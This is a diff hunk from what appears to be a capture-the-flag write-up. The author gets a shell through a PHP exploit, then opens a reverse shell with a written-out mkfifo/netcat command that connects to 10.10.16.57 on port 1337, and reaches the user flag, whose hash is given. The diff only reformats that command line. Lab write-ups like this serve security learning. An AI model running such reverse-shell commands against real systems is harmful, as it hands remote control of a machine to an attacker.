@@ -19,7 +19,9 @@ I searched for exploits regarding that PHP version and came across this: https:/
 
 After running the code, I got a shell. I ran "id" and found that I was logged in as a user named "james". I ran the "ls" command and saw listed directories. I tried to navgate through the directories but that didn't work. However, other commands seemed to be working fine. I decided to use a reverse shell to see if that would allow me to traverse through directories.
 
-I looked at this website: https://pentestbook.six2dez.com/exploitation/reverse-shells for commands that can be used to create reverse shells. I used the first command underneath the bash section: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.57 1337 >/tmp/f and generated a reverse shell.
+I looked at this website: https://pentestbook.six2dez.com/exploitation/reverse-shells for commands that can be used to create reverse shells. I used the first command underneath the bash section: 
+                rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.57 1337 >/tmp/f
+and generated a reverse shell.
 
 The reverse shell allowed me to navigate through the directories! I went to /home/james and saw a file called user.txt. That's the first flag: 17c3bb751e9961c0cbc0e1de916a4bd9
 
